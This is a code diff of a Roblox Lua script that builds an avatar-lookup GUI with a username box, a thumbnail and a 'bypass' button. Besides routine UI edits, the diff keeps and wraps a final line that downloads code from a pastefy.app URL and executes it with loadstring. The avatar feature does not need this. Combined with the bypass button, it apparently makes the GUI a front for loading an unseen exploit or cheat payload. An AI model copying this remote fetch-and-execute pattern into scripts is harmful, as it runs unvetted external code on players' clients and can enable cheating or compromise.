@@ -1,7 +1,10 @@
--- LocalScript inside StarterGui > AvatarGui
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
 -- Create GUI Elements
-local screenGui = script.Parent
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AvatarGui"
+screenGui.Parent = playerGui
 
 -- Frame
 local frame = Instance.new("Frame")
@@ -23,6 +26,7 @@ title.Parent = frame
 
 -- Username Input
 local usernameBox = Instance.new("TextBox")
+usernameBox.Name = "UsernameBox"
 usernameBox.PlaceholderText = "Type Roblox username..."
 usernameBox.Size = UDim2.new(1, -20, 0, 40)
 usernameBox.Position = UDim2.new(0, 10, 0, 50)
@@ -30,10 +34,12 @@ usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 usernameBox.Font = Enum.Font.Gotham
 usernameBox.TextSize = 18
+usernameBox.ClearTextOnFocus = false
 usernameBox.Parent = frame
 
 -- Avatar Image
 local avatarImage = Instance.new("ImageLabel")
+avatarImage.Name = "AvatarImage"
 avatarImage.Size = UDim2.new(0, 100, 0, 100)
 avatarImage.Position = UDim2.new(0.5, -50, 0, 100)
 avatarImage.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
@@ -63,14 +69,17 @@ bypassButton.Parent = frame
 
 -- Function: Fetch Avatar
 local function updateAvatar(username)
-	if username == "" then return end
+	if username == "" then
+		avatarImage.Image = ""
+		return
+	end
 	
 	local Players = game:GetService("Players")
 	local success, userId = pcall(function()
 		return Players:GetUserIdFromNameAsync(username)
 	end)
 	
-	if success then
+	if success and userId then
 		local thumbType = Enum.ThumbnailType.HeadShot
 		local thumbSize = Enum.ThumbnailSize.Size100x100
 		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
@@ -89,7 +98,10 @@ usernameBox.FocusLost:Connect(function(enterPressed)
 	end
 end)
 
-loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
-
-
-
+-- Run your external loadstring script
+local success, err = pcall(function()
+	loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
+end)
+if not success then
+	warn("Failed to load external script:", err)
+end
